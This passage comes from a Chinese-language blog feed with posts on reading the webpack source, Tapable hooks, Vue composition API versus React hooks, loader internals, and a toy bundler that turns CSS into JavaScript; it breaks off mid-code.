        <content type="html"><![CDATA[<blockquote><p><a href="mailto:&#119;&#x65;&#x62;&#x70;&#x61;&#99;&#107;&#x40;&#x35;&#x2e;&#x31;&#x30;&#46;&#49;">&#119;&#x65;&#x62;&#x70;&#x61;&#99;&#107;&#x40;&#x35;&#x2e;&#x31;&#x30;&#46;&#49;</a><br><a href="mailto:&#119;&#x65;&#98;&#x70;&#97;&#x63;&#x6b;&#x2d;&#x63;&#108;&#105;&#64;&#x34;&#x2e;&#x32;&#46;&#48;">&#119;&#x65;&#98;&#x70;&#97;&#x63;&#x6b;&#x2d;&#x63;&#108;&#105;&#64;&#x34;&#x2e;&#x32;&#46;&#48;</a><br>阅读源码小技巧：折叠所有代码，先不看所有的变量声明和 require，要是之后用到再看，直接看主要逻辑。<br>带着问题看源码</p></blockquote><h1 id="第一个问题"><a href="#第一个问题" class="headerlink" title="第一个问题"></a>第一个问题</h1><ul><li><strong>webpack-cli 是如何调用 webpack 的</strong></li><li>在 demo 目录运行 webpack-cli，会自动把 src&#x2F;index.js 打包为 dist&#x2F;main.js</li><li>显然会调用 webpack 来打包，那么请问是如何做到的</li></ul><ol><li>首先当我们运行 webpack-cli 命令的时候，会去执行 bin&#x2F;cli.js 。</li><li>折叠文件所有代码，跳过 require 和所有声明，第一个 if 不看，之后的 if else 就需要打开来看了，因为这段话必定要执行，我们先假设 webpack 存在，进入 runCli 这个函数。</li><li>折叠所有代码，直接看主分支 try catch 里面，主要调用了 cli.run 这个方法。</li><li>进入 cli.run，第一个方法 <code>this.runOptionGroups(args)</code> 从名字可以看出和配置项相关，所以跳过，最后发现执行了 <code>this.createCompiler</code> 这个函数。</li><li>进入 createCompiler 并折叠函数，我们发现他其实就是调用了 webpack 这个函数。</li></ol><p><img src="/Blog/2021/04/22/javascript/%E9%98%85%E8%AF%BBwebpack%E6%BA%90%E7%A0%81/index/img.gif" alt="阅读全过程"></p><ul><li><strong>看完源码之后明白</strong></li><li>compiler &#x3D; webpack(options, callback)</li><li>webpack &#x3D; require(‘webpack’)</li><li>webpack-cli 就是这么调用 webpack 的</li></ul><h1 id="第二个问题"><a href="#第二个问题" class="headerlink" title="第二个问题"></a>第二个问题</h1><ul><li><strong>webpack 是如何分析 index.js 的</strong></li><li>通过之前自己做的简易打包器，打包器需要先分析并收集依赖，然后打包成一个文件</li><li>那么 webpack 肯定也做了这件事</li><li>显然 webpack 也需要分析 AST，不可能用正则来做</li></ul><p><img src="/Blog/2021/04/22/javascript/%E9%98%85%E8%AF%BBwebpack%E6%BA%90%E7%A0%81/index/img_1.gif" alt="阅读全过程"></p><ol><li>直接看 webpack 的 package.json 的 main 属性，可以得知入口是 lib&#x2F;index.js。</li><li>进入 index.js，主要是导出了一个函数，这个函数又是从 ‘.&#x2F;webpack’ 里面的。</li><li>进入 ‘.&#x2F;webpack’，也是主要导出了一个webpack 这个函数，第一个函数 <code>validateSchema</code> 是验证函数（不看），然后是 一个 if else，一般我们用 webpck 的时候，options 一般都不会是一个数组，所以我们看 else，执行了 一个 createCompiler 函数。</li><li>懵逼了，凭我目前的认知，看不懂这套逻辑了，createCompiler 就是 return 了一个 new Compiler，compiler.hooks.xxx.call 干了什么，猜测主要逻辑应该在这个里面（排除法）。</li></ol><ul><li><strong>看了源码之后发现</strong></li><li>看了半天，就发现创建了一个compiler 对象，然后什么都没做</li><li>hooks.xxx.call 是什么鬼？</li><li>看源码不是好的学习方式，性价比低</li><li>第一次劝退</li></ul><h2 id="hooks-xxx-call-是什么"><a href="#hooks-xxx-call-是什么" class="headerlink" title="hooks.xxx.call 是什么"></a>hooks.xxx.call 是什么</h2><ul><li><strong>Tapable</strong></li><li>这是 webpack 团队为了写 wepack 而写的一个事件&#x2F;钩子库（也就是发布订阅）</li><li><strong>用法</strong></li><li>定义一个事件&#x2F;钩子</li><li>this.hooks.eventName &#x3D; new SyncHook([‘arg1’, ‘arg2’]);</li><li>监听一个事件&#x2F;钩子</li><li>this.hooks.eventName.tap(‘监听理由’, fn)</li><li>触发一个事件&#x2F;钩子</li><li>this.hooks.eventName.call(‘arg1’, ‘arg2’)<blockquote><p>教训：看源码时，遇到不懂的，要快速学会</p></blockquote></li></ul><h1 id="新的第二个问题"><a href="#新的第二个问题" class="headerlink" title="新的第二个问题"></a>新的第二个问题</h1><ul><li><strong>webpack 的流程是怎么样的</strong></li><li>webpack 把打包分为了哪几个阶段（事件或钩子）</li><li><strong>看完代码发现</strong></li><li>至少有 env init run beforeCompile compile compilation make finishMake afterCompile emit 这几个钩子</li></ul><h1 id="流程图待补充"><a href="#流程图待补充" class="headerlink" title="流程图待补充"></a>流程图待补充</h1><h1 id="第三个问题"><a href="#第三个问题" class="headerlink" title="第三个问题"></a>第三个问题</h1><ul><li><strong>读取 index.js 并分析和收集依赖是在哪个阶段？</strong></li><li>用排除法可以知道，肯定不是 env 和 emit，肯定在 beforeCompile 和 afterCompile 之间</li><li>最有可能是在 make - finishMake 阶段（为什么？）</li><li>学过 C 语言就会知道，make 是编译时必然会用到的工具，可见很重要</li><li><strong>验证想法</strong></li><li>我们发现 make - finishMake 之间什么代码都没有</li></ul><h1 id="第四个问题"><a href="#第四个问题" class="headerlink" title="第四个问题"></a>第四个问题</h1><ul><li><strong>make - finishMake 之间，做了什么</strong></li><li>搜索 make.tap，发现很多监听了 make 事件</li><li>还是根据排除法，应该是 EntryPlugin（<strong>由此发现 webpack 为什么什么都不做呢，因为 webpack 只是把流程安排好，其他事情都交给插件去做，webpack 架构就是事件模型，你要做什么事情，你自己去找相对应的钩子去插入就好了</strong>）</li><li>EntryPlugin 的 addEntry 函数就是 make 阶段最重要的事情之一</li><li><strong>死胡同</strong></li><li>跟代码跟到 factorizeQueue 就发现没有后续代码了，怎么办？</li><li><strong>第三次劝退</strong></li><li>需要补充任务队列知识，任务队列发现有任务会自动执行</li></ul><h1 id="第五个问题"><a href="#第五个问题" class="headerlink" title="第五个问题"></a>第五个问题</h1><ul><li><strong>factor.create 是什么东西</strong></li><li>这个 factor 是哪里来的？</li><li>是从 factorizeModule(options 的 options.factory 来的)</li><li>这个 options.factory 是哪里来的？</li><li>是从 moduleFactory 来的</li><li>moduleFactory 哪里来的？</li><li>是用 this.dependencyFactories.get(Dep) 得到的</li><li>this.dependencyFactories.get(Dep) 是个啥？</li><li>你搜 compilation.tap 就知道，他是 normalModuleFactory，简称 <em><strong>nmf</strong></em></li><li>结论：factor 就是 nmf，所以 factory.create 就是 nmf.create</li></ul><h1 id="第六个问题"><a href="#第六个问题" class="headerlink" title="第六个问题"></a>第六个问题</h1><ul><li><strong>nmf.create 做了什么</strong></li><li>来到 NormalModuleFactory.js，可以看到 create 的代码</li><li>只发现一具有用的代码：beforeResolve.call 和 factorize.call</li><li>搜索两者对应的 tap，发现 factorize.tap 里面有重要代码</li><li>他触发了 resolve，而 resolve 主要是在收集 loaders</li><li>然后他触发了 createModule，得到了 createdModule</li><li>也就是说，nmf.create 得到了一个 module 对象</li><li>等价于 factor.create 得到了一个 module 对象</li><li>回想一下，我们怎么找到 factory.create 的？</li><li>你可以使用 back 功能回来之前的停顿点</li><li>我们是从 factorizeModule 来到 factory.create 的</li><li>回来 factorizeModule，发现后续操作是 addModule 和 buildModule</li></ul><h1 id="第七个问题"><a href="#第七个问题" class="headerlink" title="第七个问题"></a>第七个问题</h1><ul><li><strong>addModule 做了什么</strong></li><li>把module 添加到 compilation.modules 里</li><li>而且还通过检查 id 防止重复添加</li></ul><h1 id="第八个问题"><a href="#第八个问题" class="headerlink" title="第八个问题"></a>第八个问题</h1><ul><li><strong>buildModule 做了什么</strong></li><li>看名字就知道是重要操作，它调用了 module.build()</li><li>来到 NormalModule.js（猜的，跟 nmf 差不多） 看 build 源码，发现了 runLoaders</li><li>然后来到 processResult()，发现了 _source &#x3D; … 和 _ast &#x3D; null</li><li>这是要做什么？显然是要把 _source 变成 _ast 了！</li><li>这就是我们第二个问题（webpack 如何分析 index.js） 的答案！</li><li>来到 doBuild 的回调，发现了 this.parser.parse()！</li><li>终于，着整个过程就是最开始我们的简易打包器的过程（AST、Babel、依赖）</li><li>parse 就是把 code 变成 ast</li><li>问题来了，parser 是什么，parse() 的源码在哪儿？</li><li>继续跟代码会发现 parser （javascriptParser.js）来自于acorn 库，需要编译原理知识（涉及到盲区了）</li></ul><h1 id="第九个问题"><a href="#第九个问题" class="headerlink" title="第九个问题"></a>第九个问题</h1><ul><li><strong>webpack 如何知道 index.js 依赖了那些文件的</strong></li><li>目前我们知道 webpack 会对 index.js 进行 parse 得到 ast</li><li>那么接下来 webpack 应该会 traverse 这个 ast，寻找 import 语句</li><li>那么相关代码在哪儿？</li><li><strong>阅读源码发现</strong></li><li>JavascriptParser.js 的 3231 行得到 ast，3260~3264 行 traverse 了 ast</li><li>其中 blockPreWalkStatement() 对 ImportDeclaration 进行了检查</li><li>一旦发现 import ‘xxx’，就会触发 import 钩子，对应的监听函数会处理依赖</li><li>其中 walkStatements() 对 importExpression 进行了检查</li><li>一旦发现 import(‘xxx’)，就会触发 importCall 钩子，对应的监听函数也会</li></ul><h1 id="第十个问题"><a href="#第十个问题" class="headerlink" title="第十个问题"></a>第十个问题</h1><ul><li><strong>怎么把 Modules 合并成一个文件的？</strong></li><li>看 compilation.seal()（猜的，只剩这个阶段了），该函数会创建 chunks、 为每个 chunk 进行 codeGeneration，然后为每个 chunk 创建 asset（搜索 write，发现writeOut）</li><li>seal() 之后，emitAssets()、emitFiles() 会创建文件</li><li>最终得到 dist&#x2F;main.js 和其他 chunk 文件</li></ul><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><strong>webpack 怎么分析依赖和打包的</strong></li><li>使用 JavascriptParser 对 index.js 进行 parse 得到 ast，然后遍历 ast</li><li>发现依赖声明就将其添加到 module 的 dependencies 或 blocks 中</li><li>seal 阶段，webpack 将 module 转为 chunk，可能会把多个 module 通过 codeGeneration 合并为一个 chunk</li><li>seal 之后，为每个 chunk 创建文件，并写到硬盘上</li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么要使用 composition-api</title>
      <link href="/Blog/2021/04/18/essay/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8composition-api/index/"/>
      <url>/Blog/2021/04/18/essay/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8composition-api/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://vuejs.org/guide/extras/composition-api-faq.html">文档动机章节</a><br><a href="https://juejin.cn/post/6844903877574295560">精读《Vue3.0 Function API》</a><br><a href="https://zhuanlan.zhihu.com/p/133819602">Vue3 究竟好在哪里?</a></p><p>Vue2 的代码模式下存在的几个问题。</p><ol><li>随着功能的增长，复杂组件的代码变得越来越难以维护。 尤其发生你去新接手别人的代码时。 根本原因是 Vue 的现有 API 通过「选项」组织代码，但是在大部分情况下，通过逻辑考虑来组织代码更有意义。</li><li>缺少一种比较「干净」的在多个组件之间提取和复用逻辑的机制。</li><li>类型推断不够友好。</li></ol><h3 id="Hook-和-Mixin-amp-HOC-对比"><a href="#Hook-和-Mixin-amp-HOC-对比" class="headerlink" title="Hook 和 Mixin &amp; HOC 对比"></a>Hook 和 Mixin &amp; HOC 对比</h3><p>说到这里，还是不得不把官方对于「Mixin &amp; HOC 模式」所带来的缺点整理一下。</p><ol><li>渲染上下文中公开的属性的来源不清楚。 例如，当使用多个 mixin 读取组件的模板时，可能很难确定从哪个 mixin 注入了特定的属性。</li><li>命名空间冲突。 Mixins 可能会在属性和方法名称上发生冲突，而 HOC 可能会在预期的 prop 名称上发生冲突。</li><li>性能问题，HOC 和无渲染组件需要额外的有状态组件实例，这会降低性能。</li></ol><p>而 「Hook」模式带来的好处则是：</p><ol><li>暴露给模板的属性具有明确的来源，因为它们是从 Hook 函数返回的值。</li><li>Hook 函数返回的值可以任意命名，因此不会发生名称空间冲突。</li><li>没有创建仅用于逻辑重用的不必要的组件实例。</li></ol><h3 id="React-Hook-和-Vue-Hook-对比"><a href="#React-Hook-和-Vue-Hook-对比" class="headerlink" title="React Hook 和 Vue Hook 对比"></a>React Hook 和 Vue Hook 对比</h3><p>其实 React Hook 的限制非常多，比如官方文档中就专门有一个**<a href="https://link.zhihu.com/?target=https://zh-hans.reactjs.org/docs/hooks-rules.html">章节</a>**介绍它的限制：</p><ol><li>不要在循环，条件或嵌套函数中调用 Hook</li><li>确保总是在你的 React 函数的最顶层调用他们。</li><li>遵守这条规则，你就能确保 Hook 在每一次渲染中都按照同样的顺序被调用。这让 React 能够在多次的 useState 和 useEffect 调用之间保持 hook 状态的正确。</li></ol><p>而 Vue 带来的不同在于：</p><ol><li><p>与 React Hooks 相同级别的逻辑组合功能，但有一些重要的区别。 与 React Hook 不同，<code>setup</code> 函数仅被调用一次，这在性能上比较占优。</p></li><li><p>对调用顺序没什么要求，每次渲染中不会反复调用 Hook 函数，产生的的 GC 压力较小。</p></li><li><p>不必考虑几乎总是需要 useCallback 的问题，以防止传递<code>函数prop</code>给子组件的引用变化，导致无必要的重新渲染。</p></li><li><p>React Hook 有臭名昭著的闭包陷阱问题（甚至成了一道热门面试题，omg），如果用户忘记传递正确的依赖项数组，useEffect 和 useMemo 可能会捕获过时的变量，这不受此问题的影响。 Vue 的自动依赖关系跟踪确保观察者和计算值始终正确无误。</p></li><li><p>不得不提一句，React Hook 里的「依赖」是需要你去手动声明的，而且官方提供了一个 eslint 插件，这个插件虽然大部分时候挺有用的，但是有时候也特别烦人，需要你手动加一行丑陋的注释去关闭它。</p></li></ol><p><img src="/Blog/2021/04/18/essay/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8composition-api/index/img.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vue VS react</title>
      <link href="/Blog/2021/04/14/essay/vue-VS-react/index/"/>
      <url>/Blog/2021/04/14/essay/vue-VS-react/index/</url>
      
        <content type="html"><![CDATA[<p>基础：<br>vue 是双向绑定，MVVM<br>react 是单项数据流 ui &#x3D; f(data)</p><p>进阶：<br>vue 早就不强调 MVVM，主要强调数据响应式（核心），也早就没有了双向绑定，全篇文档就只有 v-model 出现了这个词。<br>react 核心的函数式，（无副作用，引用透明，纯函数，数据不可变）这些词 vue 从来不会提到，绝对不会说，hook 是怎么实现在函数里实现状态</p><p>vue 是一个以数据响应式为核心的 ui 框架，她的核心思想是吧所有的数据放进一个对象，然后操作这个对象，对象被监听对改变以后去改变ui。<br>react 用一个函数来表示一个组件，你爸数据放进去，他就会把数据渲染进去，然后我们在放数据的时候，我们要做到数据不可变，不能像vue那样去改变之前的数据，而是新生成一个跟之前不一样的数据，然后塞到函数里，然后这个函数会生成新的 ui，之后通过 dom diff 对比这两个ui，得到一个patch，然后把这个patch更新到dom树立，<br>这个思想完全和vue不一样，有没有发现vue是不需要dom diff，数据一变去更新相关的ui就好了，为什么vue 也有dom diff呢？vue是为了解决另一个问题，server render 问题，解决模版优化的问题而不是 ui 的问题。react 是需要的，他得到的是两个不同的ui， 通过 diff 一下才知道那里需要更新。</p><p>定位：这俩定位是差不多的，都是处理 UI 层的，只不过 Vue 提倡渐进式处理，功能可以一点一点加上去，但是 React ，如果你要用，你需要重新写，需要加入 webpack jsx<br>写法：Vue 推崇模版语法，好像还是在写 HTML，而 React 完全相反，所有东西都写在 JS 里面，使用 JSX 语法， 但是 Vue 也可以用 JSX<br>Hooks：最新版的 Vue 有 Composion Api 和 react 的 hooks 差不多。<br>UI 更新策略：React 每次都会生成新的数据，通过 dom diff 来更新，而 Vue 是数据响应式，哪里变了哪里更新<br>文化：Vue 社区全家桶都准备好了，Vue-router，vuex，以前还有 vue-resource，现在没了，而 React，单纯的库，自己去社区找。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>封装一个打开 dialog 的函数</title>
      <link href="/Blog/2021/04/13/essay/%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E6%89%93%E5%BC%80dialog%E7%9A%84%E5%87%BD%E6%95%B0/index/"/>
      <url>/Blog/2021/04/13/essay/%E5%B0%81%E8%A3%85%E4%B8%80%E4%B8%AA%E6%89%93%E5%BC%80dialog%E7%9A%84%E5%87%BD%E6%95%B0/index/</url>
      
        <content type="html"><![CDATA[<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Dialog</span> <span class="keyword">from</span> <span class="string">&#x27;./Dialog.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; createApp, h &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title function_">openDialog</span> = options =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123;title, content&#125; = options</span><br><span class="line">  <span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">  <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div)</span><br><span class="line">  <span class="keyword">const</span> app = <span class="title function_">createApp</span>(&#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">h</span>(<span class="title class_">Dialog</span>, &#123;<span class="attr">visible</span>: <span class="literal">true</span>, <span class="string">&#x27;onUpdate:visible&#x27;</span>: <span class="function"><span class="params">newVisible</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (newVisible === <span class="literal">false</span>) &#123;</span><br><span class="line">          app.<span class="title function_">unmount</span>(div)</span><br><span class="line">          div.<span class="title function_">remove</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;&#125;, &#123;title, content&#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>css-loader 源码阅读</title>
      <link href="/Blog/2021/03/30/javascript/css-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/"/>
      <url>/Blog/2021/03/30/javascript/css-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/</url>
      
        <content type="html"><![CDATA[<p><img src="/Blog/2021/03/30/javascript/css-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/img.png"></p><p><img src="/Blog/2021/03/30/javascript/css-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/img_1.png"></p><ol><li>全部折叠代码以后，我们发现前两步也是获取  options，验证 options</li><li>直接看最后一行，是一个 callback，因为 css-loader 是异步的，</li><li>我们主要看 moduleCode，点击进入</li></ol><p><img src="/Blog/2021/03/30/javascript/css-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/img_2.png"></p><ol start="4"><li>基本架构和之前差不多，也是得到 code，然后 return 出去</li><li>除此之外还有很多的代码都是在做兼容和加载另外的插件</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>两个 loader 源码总结</title>
      <link href="/Blog/2021/03/30/javascript/%E4%B8%A4%E4%B8%AAloader%E6%BA%90%E7%A0%81%E6%80%BB%E7%BB%93/index/"/>
      <url>/Blog/2021/03/30/javascript/%E4%B8%A4%E4%B8%AAloader%E6%BA%90%E7%A0%81%E6%80%BB%E7%BB%93/index/</url>
      
        <content type="html"><![CDATA[<ul><li>raw-loader</li></ul><ol><li>webpack 提供 loader-utils 和 schema-utils 作为辅助工具</li><li>webpack 通过 this 来传递上下文</li><li>getOptions(this) 可以获取 options</li><li>validate 可以验证 options 是否合法</li><li><a href="https://github.com/nodejs/node-v0.x-archive/issues/8221">JSON 的 2028 和 2029 问题</a></li></ol><ul><li>css-loader</li></ul><ol><li>无关代码过多</li><li>难就难在判断是否能找到核心代码，需要经验</li><li>this.async() 用于获取回调，所有异步都需要这行</li><li>善用代码跳转功能，善用 ctrl + F</li><li>核心内容只占不到 1&#x2F;10 都不到，大部分内容都是插件和细节</li><li>很难看出脉络</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>raw-loader 源码阅读</title>
      <link href="/Blog/2021/03/24/javascript/raw-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/"/>
      <url>/Blog/2021/03/24/javascript/raw-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/</url>
      
        <content type="html"><![CDATA[<h4 id="这个最简单的-loader-就是加载任意文件，但是不做任何处理，直接导出"><a href="#这个最简单的-loader-就是加载任意文件，但是不做任何处理，直接导出" class="headerlink" title="这个最简单的 loader 就是加载任意文件，但是不做任何处理，直接导出"></a>这个最简单的 loader 就是加载任意文件，但是不做任何处理，直接导出</h4><p><img src="/Blog/2021/03/24/javascript/raw-loader%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/index/img.png"></p><p>所有代码就这么几行</p><ol><li>获取选项（第 7 行）</li><li>验证选项(第 9 行，这两步像是 webpack 的固定流程)</li><li>然后开始转换代码（第 14 行）（这里之所以使用 replace 是因为 JSON 的 bug，因为使用了 JSON.stringify 来加引号造成的，他不仅能加引号，还会把重复的引号进行转译，除了两个特殊符号需要手动转译(\u2028和\u2029) ）</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Loader 原理</title>
      <link href="/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/"/>
      <url>/Blog/2021/03/24/javascript/Loader%E5%8E%9F%E7%90%86/index/</url>
      
        <content type="html"><![CDATA[<p>上文我们写了一个打包器，但是只能加载 JS 文件，现在我们尝试让他可以加载 CSS</p><h2 id="如何加载-CSS"><a href="#如何加载-CSS" class="headerlink" title="如何加载 CSS"></a>如何加载 CSS</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>我们的 bundle 只能加载 JS</li><li>我们想要加载 CSS</li><li>如果我们能把 CSS 变成 JS。那么就可以加载 CSS 了<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">code</span> = readFileSync(filepath).toString()</span><br><span class="line"><span class="keyword">if</span> (/\.css$/.test(filepath)) &#123;</span><br><span class="line">  <span class="keyword">code</span> = `</span><br><span class="line">    const <span class="keyword">code</span> = $&#123;JSON.stringify(<span class="keyword">code</span>)&#125;;</span><br><span class="line">    <span class="keyword">export</span> default <span class="keyword">code</span>;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如此一来，我们的 CSS 文件就变成了 js文件，但是目前并没有用，CSS 并不会生效。</p></blockquote></li></ol><blockquote><p>再加一个骚操作即可让 CSS 生效</p></blockquote><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取文件内容，将内容放至 depRelation</span></span><br><span class="line"><span class="keyword">let</span> <span class="keyword">code</span> = readFileSync(filepath).toString()</span><br><span class="line"><span class="keyword">if</span> (/\.css$/.test(filepath)) &#123;</span><br><span class="line">  <span class="keyword">code</span> = `</span><br><span class="line">    const <span class="keyword">code</span> = $&#123;JSON.stringify(<span class="keyword">code</span>)&#125;;</span><br><span class="line">    <span class="keyword">if</span> (document) &#123;</span><br><span class="line">      const style = document.createElement(<span class="string">&#x27;style&#x27;</span>);</span><br><span class="line">      style.innerText = <span class="keyword">code</span>;</span><br><span class="line">      document.head.appendChild(style);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">export</span> default <span class="keyword">code</span>;</span><br><span class="line">  `</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; parse &#125; from <span class="string">&quot;@babel/parser&quot;</span></span><br><span class="line"><span class="keyword">import</span> traverse from <span class="string">&quot;@babel/traverse&quot;</span></span><br><span class="line"><span class="keyword">import</span> &#123; writeFileSync, readFileSync &#125; from <span class="string">&#x27;fs&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123; resolve, relative, dirname, join &#125; from <span class="string">&#x27;path&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> * <span class="keyword">as</span> babel from <span class="string">&#x27;@babel/core&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;mkdir&#125; from <span class="string">&#x27;shelljs&#x27;</span></span><br><span class="line"></span><br><span class="line">// 设置根目录</span><br><span class="line">const projectName = <span class="string">&#x27;project_css&#x27;</span></span><br><span class="line">const projectRoot = resolve(__dirname, projectName)</span><br><span class="line">// 类型声明</span><br><span class="line">type DepRelation = &#123;<span class="built_in"> key</span>:<span class="built_in"> string</span>, deps:<span class="built_in"> string</span>[], code:<span class="built_in"> string</span> &#125;[]</span><br><span class="line">// 初始化一个空的 depRelation，用于收集依赖</span><br><span class="line">const depRelation: DepRelation = [] // 数组！</span><br><span class="line"></span><br><span class="line">// 将入口文件的绝对路径传入函数，如 D:\demo\fixture_1\index.js</span><br><span class="line">collectCodeAndDeps(resolve(projectRoot, <span class="string">&#x27;index.js&#x27;</span>))</span><br><span class="line"></span><br><span class="line">// 先创建 dist 目录</span><br><span class="line">const dir = `./$&#123;projectName&#125;/dist`</span><br><span class="line">mkdir(<span class="string">&#x27;-p&#x27;</span>, dir) </span><br><span class="line">// 再创建 bundle 文件</span><br><span class="line">writeFileSync(join(dir, <span class="string">&#x27;bundle.js&#x27;</span>), generateCode()) </span><br><span class="line">console.log(<span class="string">&#x27;done&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> generateCode() &#123;</span><br><span class="line">  <span class="keyword">let</span> code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  code += <span class="string">&#x27;var depRelation = [&#x27;</span> + depRelation.<span 